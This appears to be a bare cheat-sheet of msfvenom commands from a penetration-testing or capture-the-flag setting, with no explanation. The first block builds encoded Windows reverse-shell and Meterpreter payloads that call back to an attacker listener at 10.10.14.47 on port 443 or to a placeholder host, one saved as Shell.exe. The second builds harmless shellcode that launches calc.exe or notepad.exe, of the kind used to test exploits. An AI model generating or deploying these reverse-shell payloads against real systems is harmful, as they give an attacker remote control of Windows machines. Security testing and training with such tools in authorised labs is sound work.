
```
msfvenom -p windows/shell_reverse_tcp -f raw -e x86/alpha_mixed LHOST=10.10.14.47 LPORT=443 > Shell
msfvenom -p windows/meterpreter/reverse_tcp  LHOST=10.10.14.47 LPORT=443 -f raw -e x86/alpha_mixed > Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x1 LPORT=7777 -f exe -o Shell.exe
```
```
msfvenom --payload windows/x64/exec CMD=calc.exe -a x64 --platform windows -f raw -o calc64.bin
msfvenom --payload windows/x64/exec CMD=notepad.exe -a x64 --platform windows -f raw -o notepad64.bin
msfvenom --payload windows/exec CMD=notepad.exe -a x86 --platform windows -f raw -o notepad32.bin
msfvenom --payload windows/exec CMD=calc.exe -a x86 --platform windows -f raw -o calc32.bin
```
